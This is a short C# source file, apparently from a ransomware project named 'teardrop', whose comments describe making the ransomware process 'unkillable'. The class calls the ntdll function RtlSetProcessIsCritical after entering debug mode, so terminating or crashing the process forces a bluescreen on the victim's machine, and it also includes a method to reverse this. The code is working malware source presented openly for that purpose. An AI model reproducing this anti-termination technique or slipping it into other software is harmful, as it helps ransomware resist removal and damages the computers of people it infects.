using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace teardrop
{
    // The folllowing class is used to make the process "unkillable".
    // By calling "Make.ProcessUnkillable();" the process enters a debug mode
    // and sets itself to a critical process. This means when the ransomware is
    // terminated or crashes, it will cause a bluescreen.
    internal class ManageProcess
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);

        public static void ProcessUnkillable()      // Enabled the "unkillable" feature
        {
            Process.EnterDebugMode();
            RtlSetProcessIsCritical(1, 0, 0);
        }

        public static void ProcessKillable()        // Disables the "unkillable" feature
        {
            RtlSetProcessIsCritical(0, 0, 0);
        }
    }
}
